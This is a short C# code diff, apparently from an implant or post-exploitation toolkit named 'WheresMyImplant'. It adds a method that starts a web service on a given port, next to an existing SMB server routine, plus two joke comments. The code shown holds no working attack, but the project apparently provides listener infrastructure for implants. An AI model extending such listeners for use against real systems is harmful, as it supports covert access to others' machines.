@@ -448,6 +448,8 @@ namespace WheresMyImplant
             return output.ToString();
         }
 
+
+        //FormalChicken
         public static void StartSmbServer(String pipeName)
         {
             Console.WriteLine("Starting SMB Server");
@@ -459,6 +461,13 @@ namespace WheresMyImplant
                     smbServer.mainLoop();
                 }
             }
+        }
+
+        //GothTurkey
+        public static void StartWebServiceServer(String serviceName, String port)
+        {
+            Console.WriteLine("Starting Web Service");
+            WebService webService = new WebService(serviceName, port);
         }
     }
 }
